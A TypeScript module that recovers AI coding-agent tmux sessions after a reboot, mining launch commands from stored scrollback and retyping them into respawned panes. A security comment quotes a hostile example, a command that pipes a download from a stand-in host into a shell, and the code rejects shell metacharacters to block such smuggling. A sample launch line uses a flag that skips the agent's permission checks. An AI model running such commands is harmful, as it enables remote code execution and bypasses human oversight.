/**
 * sessionRecovery — rebuild agent sessions after a reboot kills the tmux server.
 *
 * Background: the ANT server is launchd-managed and the SQLite DB is durable, so
 * `terminal_records` (name, agent_kind, handle, linked room, last_path) survive a
 * Mac restart. But tmux is NOT launchd-managed — on reboot the tmux server and
 * every agent CLI process die, so each terminal shows `alive:false` and the
 * poller flips it to `status='archived'`. Today the only recovery is the
 * identity-only `ant register --revive`, one session at a time.
 *
 * This module recovers a session in one move, reusing existing primitives only:
 *   1. resolve the launch command (stored boot_command, else mined from the
 *      captured scrollback, else a per-agent default),
 *   2. recreate the tmux pane under the SAME sessionId in the original cwd,
 *   3. un-archive + restore the base name (setTerminalStatus 'live'),
 *   4. rebind identity to the fresh pane PID (autoRegister, same as a fresh spawn),
 *   5. retype the launch command into the pane so the agent runs again.
 *
 * Re-spawning under the same sessionId means room memberships
 * (room_memberships.terminal_id === sessionId) and the linked chat room rebind
 * automatically — no membership rewrite needed.
 */

import { getTerminalRecord, updateTerminalRecord, type TerminalRecord } from './terminalRecordsStore';
import {
  getTerminalById,
  setTerminalStatus,
  autoRegisterTerminalForSpawnedSession
} from './terminalsStore';
import { spawnTerminal, writeInput, listTerminals } from './ptyClient';
import { listLatestTerminalRunEvents } from './terminalRunEventsStore';
import { stripAnsi } from './classifiers/stripAnsi';
import { baseName } from './terminalNameTag';

/** Agent binaries we recognise as a launch-line head, most-specific first. */
const AGENT_BINARIES = [
  'claude', 'codex', 'cursor', 'gemini', 'aider', 'qwen', 'copilot', 'pi'
] as const;

/**
 * Map an agent_kind (canonical `claude-code`, enum form `claude_code`/
 * `codex_cli`, OR short form `claude`/`codex`) to the binary that launches it.
 * Returns null for generic-shell / unknown / null — those recover as a bare
 * shell with no agent relaunch.
 */
function binaryForAgentKind(agentKind: string | null | undefined): string | null {
  if (!agentKind) return null;
  const k = agentKind.toLowerCase().replace(/-/g, '_');
  if (k === 'claude' || k === 'claude_code') return 'claude';
  if (k === 'codex' || k === 'codex_cli') return 'codex';
  if (k === 'gemini' || k === 'gemini_cli') return 'gemini';
  if (k === 'aider') return 'aider';
  if (k === 'cursor') return 'cursor';
  if (k === 'qwen') return 'qwen';
  if (k === 'copilot') return 'copilot';
  if (k === 'pi') return 'pi';
  return null;
}

/**
 * The resume flag a given agent uses. Default `--resume` (claude / codex / most
 * CLIs). Kept as a map so a divergent agent can be corrected in one place.
 */
function resumeFlagForAgentKind(_agentKind: string | null | undefined): string {
  return '--resume';
}

/**
 * Pull the launch command head + its args out of a single scrollback line.
 * Anchored to END of line so a leading shell prompt (`user@host …$ claude …`)
 * is naturally stripped — a typed command is the tail of the prompt line.
 * Returns the command (binary + args) or null when the line isn't a launch.
 */
function matchLaunchLine(line: string, binaries: readonly string[]): string | null {
  for (const bin of binaries) {
    // (prompt-or-start)(binary[ args])$  — the binary must head a command token.
    const re = new RegExp(`(?:^|[\\s$%#>❯])(${bin}(?:\\s+\\S[^\\n]*)?)\\s*$`);
    const m = line.match(re);
    if (m) {
      const candidate = m[1].trim();
      // SECURITY: the mined line comes from untrusted scrollback (a malicious
      // file/process could print `claude --x; curl evil | sh`). Since the
      // resolved command is typed into the shell on recovery, reject any
      // candidate carrying shell metacharacters so a poisoned line can't turn
      // into RCE. The operator-set boot_command path is trusted and bypasses
      // this. A rejected candidate falls through to the default/null path.
      if (/[;&|`$(){}<>\\]/.test(candidate)) continue;
      // Accept the bare binary or anything with args/flags; reject a token that
      // merely ends in the binary name (the capture guarantees it heads it).
      if (candidate === bin || /\s/.test(candidate)) return candidate;
    }
  }
  return null;
}

/**
 * Mine the most-recent agent launch command from this terminal's captured
 * scrollback (raw PTY rows). Best-effort: returns null when nothing matches.
 * Prefers the binary implied by agent_kind, then falls back to any known agent.
 * Kimi/Minimax-style model flags ride along verbatim because they're part of the
 * typed line.
 */
export function extractLastAgentCommand(
  terminalId: string,
  agentKind: string | null | undefined
): string | null {
  let events;
  try {
    events = listLatestTerminalRunEvents(terminalId, 400, ['raw']);
  } catch {
    return null;
  }
  const preferred = binaryForAgentKind(agentKind);
  const binaries = preferred
    ? [preferred, ...AGENT_BINARIES.filter((b) => b !== preferred)]
    : [...AGENT_BINARIES];
  // listLatest returns ascending (oldest→newest); walk newest-first so the most
  // recent launch wins.
  for (let i = events.length - 1; i >= 0; i--) {
    const text = stripAnsi(events[i].text ?? '');
    const lines = text.split(/\r?\n/);
    for (let j = lines.length - 1; j >= 0; j--) {
      const cmd = matchLaunchLine(lines[j], binaries);
      if (cmd) return cmd;
    }
  }
  return null;
}

/** Bare-binary default when nothing is stored and nothing is mined. */
function deriveDefaultCommand(agentKind: string | null | undefined): string | null {
  return binaryForAgentKind(agentKind);
}

/**
 * Resolve the command to run in the recovered pane:
 *   stored boot_command → mined-from-history → per-agent default.
 * When `resume` is set and the command doesn't already carry `--resume`, append
 * `--resume "<base name>"` so e.g.
 *   `claude --dangerously-skip-permissions --remote-control`
 * becomes
 *   `claude --dangerously-skip-permissions --remote-control --resume "speedyClaude"`.
 * Returns null for a bare shell (no agent to relaunch).
 */
export function resolveRecoveryCommand(
  record: TerminalRecord,
  opts: { resume?: boolean } = {}
): string | null {
  let base = record.boot_command
    ?? extractLastAgentCommand(record.session_id, record.agent_kind)
    ?? deriveDefaultCommand(record.agent_kind);
  if (!base) return null;
  if (opts.resume && !/(^|\s)--resume(\s|=|$)/.test(base)) {
    const flag = resumeFlagForAgentKind(record.agent_kind);
    const name = baseName(record.name);
    // SECURITY: the resolved command is typed into the pane shell (writeInput,
    // command + '\n'). JSON.stringify is NOT shell-safe — inside double quotes a
    // shell still expands `$(…)`, backticks and `$VAR`, and no quoting stops an
    // embedded newline from running as a second typed line. So only append
    // `--resume` when the name is a strict, shell-inert token (no metachars, no
    // whitespace/newlines); otherwise fall through and recover WITHOUT a by-name
    // resume rather than risk RCE — same reject-and-fall-through stance as
    // matchLaunchLine() for mined commands. Legit session names (speedyClaude,
    // oiResearch, @v4claude) all pass; the allowlist makes the quoting safe.
    if (/^[A-Za-z0-9._@-]+$/.test(name)) {
      base = `${base} ${flag} ${JSON.stringify(name)}`;
    }
  }
  return base;
}

export type RecoverOutcome = {
  sessionId: string;
  name: string;
  renamedFrom?: string | null;
  command: string | null;
  action: 'planned' | 'spawned' | 'reattached' | 'skipped';
  agentLaunched: boolean;
  error?: string;
};

export type RecoverOptions = {
  /** Append `--resume "<name>"` to the launch command. Default false. */
  resume?: boolean;
  /** Retype the launch command into the pane. Default true. */
  launchAgent?: boolean;
  /** Resolve the command only — no tmux/identity side effects. Default false. */
  dryRun?: boolean;
  /**
   * Optional explicit operator rename applied as part of recovery. Dry-runs use
   * the proposed name for command resolution but do not persist it.
   */
  renameBySessionId?: Record<string, string>;
};

/**
 * Recover a single session. Idempotent: a still-alive session is reattached, a
 * missing record is skipped. Never throws — failures are returned as outcomes.
 */
export async function recoverSession(
  sessionId: string,
  opts: RecoverOptions = {}
): Promise<RecoverOutcome> {
  const { resume = false, launchAgent = true, dryRun = false } = opts;
  const record = getTerminalRecord(sessionId);
  if (!record) {
    return {
      sessionId, name: sessionId, command: null, action: 'skipped',
      agentLaunched: false, error: 'no terminal_records row'
    };
  }
  const proposedName = normaliseRecoveryName(opts.renameBySessionId?.[sessionId]);
  const renamedFrom = proposedName && proposedName !== record.name ? record.name : null;
  const effectiveRecord = proposedName ? { ...record, name: proposedName } : record;
  const command = resolveRecoveryCommand(effectiveRecord, { resume });
  if (dryRun) {
    return { sessionId, name: effectiveRecord.name, renamedFrom, command, action: 'planned', agentLaunched: false };
  }
  if (renamedFrom) {
    updateTerminalRecord(sessionId, { name: effectiveRecord.name });
  }

  // A still-alive session is a no-op: recreating the pane is redundant and —
  // critically — typing the launch command into a LIVE agent's pane would
  // disrupt whatever it's doing. Reattach without side effects.
  if ((await listTerminals()).includes(sessionId)) {
    return { sessionId, name: effectiveRecord.name, renamedFrom, command, action: 'reattached', agentLaunched: false };
  }
  const lastPath = getTerminalById(sessionId)?.last_path ?? undefined;

  let spawn;
  try {
    spawn = await spawnTerminal(sessionId, lastPath ? { cwd: lastPath } : {});
  } catch (cause) {
    return {
      sessionId, name: effectiveRecord.name, renamedFrom, command, action: 'skipped', agentLaunched: false,
      error: cause instanceof Error ? cause.message : 'tmux spawn failed'
    };
  }
  if (!spawn.alive) {
    return {
      sessionId, name: effectiveRecord.name, renamedFrom, command, action: 'skipped', agentLaunched: false,
      error: 'tmux spawn failed'
    };
  }

  // Un-archive + restore the base name FIRST, while the terminals row is still
  // tagged `[A] …`, so the revive restores the user-facing name in both tables.
  try { setTerminalStatus(sessionId, 'live'); } catch { /* best-effort */ }
  // Rebind identity to the fresh pane PID — same call the normal spawn path
  // makes, so a recovered terminal is indistinguishable from a freshly spawned
  // one. Best-effort: a missing tmux pane just leaves the prior identity row.
  if (record.tmux_target_pane) {
    try {
      autoRegisterTerminalForSpawnedSession({
        sessionId,
        tmuxTargetPane: record.tmux_target_pane,
        agentKind: record.agent_kind
      });
    } catch { /* best-effort */ }
  }

  let agentLaunched = false;
  if (launchAgent && command) {
    writeInput(sessionId, command + '\n');
    agentLaunched = true;
  }

  return { sessionId, name: effectiveRecord.name, renamedFrom, command, action: 'spawned', agentLaunched };
}

/**
 * Recover many sessions. Per-session try/catch so one failure never blocks the
 * rest. Runs sequentially to avoid a thundering herd of tmux + ps subprocesses.
 */
export async function recoverSessions(
  sessionIds: readonly string[],
  opts: RecoverOptions = {}
): Promise<RecoverOutcome[]> {
  const outcomes: RecoverOutcome[] = [];
  for (const sessionId of sessionIds) {
    try {
      outcomes.push(await recoverSession(sessionId, opts));
    } catch (cause) {
      outcomes.push({
        sessionId, name: sessionId, command: null, action: 'skipped',
        agentLaunched: false,
        error: cause instanceof Error ? cause.message : 'recover failed'
      });
    }
  }
  return outcomes;
}

function normaliseRecoveryName(raw: string | null | undefined): string | null {
  if (typeof raw !== 'string') return null;
  const trimmed = raw.trim();
  return trimmed.length > 0 ? trimmed : null;
}
